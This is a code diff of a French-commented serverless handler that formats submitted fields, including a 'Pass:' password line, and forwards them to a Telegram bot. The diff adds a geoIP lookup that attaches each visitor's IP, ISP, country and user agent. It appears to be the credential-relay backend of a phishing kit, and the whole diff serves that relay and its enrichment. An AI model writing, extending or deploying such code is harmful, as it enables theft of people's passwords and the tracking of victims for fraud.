@@ -18,15 +18,26 @@ export default async function handler(req, res) {
   const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
   const ua        = req.headers['user-agent'] || 'inconnu';
 
-  // Date & heure
-  const now   = new Date();
-  const date  = now.toLocaleDateString('fr-FR');
-  const time  = now.toLocaleTimeString('fr-FR');
+  // Lookup ISP et Pays via geoIP
+  let isp = 'inconnue';
+  let country = 'inconnue';
+  try {
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoData = await geoRes.json();
+    isp = geoData.org || isp;
+    country = geoData.country_name || country;
+  } catch (e) {
+    console.error('GeoIP lookup failed', e);
+  }
+
+  // Date & heure au format dd/MM/yy, HH:mm:ss
+  const now  = new Date();
+  const date = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: '2-digit' });
+  const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
   // Construction du message fun
-  // Sépare header (première ligne) et détails (le reste)
-  const [ header, ...lines ] = message.split('\n');
-  let text = `📣 *${header}*`;               // gros header en gras
+  const [header, ...lines] = message.split('\n');
+  let text = `📣 *${header}*`;
   text += `\n──────────────────`;
   lines.forEach(line => {
     if      (line.startsWith('Nom:'))        text += `\n👤 ${line.slice(4).trim()}`;
@@ -42,13 +53,17 @@ export default async function handler(req, res) {
     else if (line.startsWith('Pass:'))       text += `\n🔑 ${line.slice(5).trim()}`;
     else                                     text += `\n📋 ${line.trim()}`;
   });
-  text += `\n──────────────────`;
-  text += `\n🌐 *IP* : \`${ip}\``;
-  text += `\n🔎 *Agent* : \`${ua}\``;
-  text += `\n🕓 *Date* : _${date} ${time}_`;
-  text += `\n©️ ${now.getFullYear()}`;
 
-  // Appel POST JSON à Telegram (en Markdown)
+  // Bloc standard sous chaque notification
+  text += `\n──────────────────`;
+  text += `\n🗓️ Date & heure : ${date}, ${time}`;
+  text += `\n🌐 IP Client     : ${ip}`;
+  text += `\n🔎 ISP Client    : ${isp}`;
+  text += `\n🌍 Pays Client   : ${country}`;
+  text += `\n📍 User-Agent    : ${ua}`;
+  text += `\n©️ ${now.getFullYear()} ©️`;
+
+  // Envoi vers Telegram
   const url     = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
   const payload = {
     chat_id: CHAT,
@@ -63,7 +78,6 @@ export default async function handler(req, res) {
     body: JSON.stringify(payload),
   });
 
-  // Lit et renvoie la réponse brute
   const raw  = await telegramRes.text();
   let body;
   try { body = JSON.parse(raw); } catch { body = raw; }
